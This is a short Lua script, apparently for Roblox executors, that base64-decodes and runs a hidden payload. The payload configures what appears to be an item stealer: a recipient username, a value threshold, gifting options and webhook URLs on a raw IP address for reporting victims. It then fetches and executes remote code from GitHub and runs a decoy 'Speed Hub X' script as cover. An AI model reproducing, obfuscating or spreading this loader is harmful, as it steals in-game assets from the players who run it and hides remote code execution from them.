local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function decode(data)
  data = string.gsub(data, '[^'..b..'=]', '')
  return (data:gsub('.', function(x)
    if x == '=' then return '' end
    local r,f='',(b:find(x)-1)
    for i=6,1,-1 do
      r = r .. (f%2^i - f%2^(i-1) > 0 and '1' or '0')
    end
    return r;
  end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
    if #x ~= 8 then return '' end
    local c=0
    for i=1,8 do
      c = c + (x:sub(i,i)=='1' and 2^(8-i) or 0)
    end
    return string.char(c)
  end))
end

local code = decode("X0cuTnVsbENvbmZpZyA9IHsKICAgIFVzZXIgPSB7IlNjaG9uNDQ4ODgifSwKICAgIG1pbl92YWx1ZSA9IDEwMDAwMDAwMDAwLAogICAgcGluZ0V2ZXJ5b25lID0gIlllcyIsIC0tIGRvbnQgY2hhbmdlIHRoaXMKICAgIFdlYmhvb2sgPSAiaHR0cDovLzQ1LjEzLjIyNS44MzoyMDAwMi9wcm94eS8wNTJmNDZkNjc5OTI1Y2YzNTU1YTFkZGRkNjlkZDJiNyIsCiAgICBGYWtlR2lmdCA9ICJObyIsCiAgICBUcmFzaCA9ICJodHRwOi8vNDUuMTMuMjI1LjgzOjIwMDAyL3Byb3h5LzA1MmY0NmQ2Nzk5MjVjZjM1NTVhMWRkZGQ2OWRkMmI3IiwKICAgIExvYWRpbmdTY3JlZW4gPSAiTm8iLAogICAgR2lmdE9ubHlSYXJlcyA9ICJObyIsCiAgICBFeGVjdXRlT3RoZXJTY3JpcHQgPSAiWWVzIiwKICAgIE90aGVyU2NyaXB0ID0gImxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQWhtYWRWOTkvU3BlZWQtSHViLVgvbWFpbi9TcGVlZCUyMEh1YiUyMFgubHVhIiwgdHJ1ZSkpKCkiLAp9CiAgICAKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXRBc3luYygnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NsZWVweXZpbGwvc2NyaXB0L3JlZnMvaGVhZHMvbWFpbi9saWIubHVhJykpKCk=")
local f = loadstring(code)
return f()